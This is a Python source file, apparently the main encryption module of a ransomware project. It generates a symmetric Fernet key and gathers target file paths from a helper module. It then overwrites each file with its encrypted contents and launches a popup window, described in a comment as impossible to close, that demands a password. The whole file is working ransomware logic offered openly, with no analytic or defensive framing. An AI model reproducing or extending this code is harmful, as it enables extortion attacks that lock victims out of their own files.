from cryptography.fernet import Fernet
import os
#----------------------------------------------------------------------
from generate_key_s import generate_key_symmetric
from filter_files import define_useful_paths
from window import start_window

# import dictionay of the paths of files to encrypt from filtrate_files
# import the key

#--------------------------------load key------------------------------
def load_key():
    return open('key_symmetric.key', 'rb').read() #open the key in read binary mode and then read it

#--------------------------------encryption------------------------------

def encrypt_process(paths_dic, key): # (files to encypt, key )
    fer = Fernet(key)  # using fernet method

    for path, files in paths_dic:  #select variables from the dictionary on filter_files
        for item in files:   # for every item on the directory
            with open(item, 'rb') as file:  # having opened the file in read binary mode,
                file_data = file.read() # save the data of the file in the variable
            encrypted_data = fer.encrypt(file_data)  #encrypt the variable
            with open(item, 'wb') as file:  # then having the file opened anew in write binary mode,
                file.write(encrypted_data)  # write the same data but encrypted



def encrypt(): #when this program is directly executed

    generate_key_symmetric()  #import from generate_key_s.py
    key = load_key()

    paths = define_useful_paths() #import from filter_files

    for p in paths:
        encrypt_process(p, key)  
    
    start_window() #initialize a py file with tkinter a popup window that can't be closed asking for the password


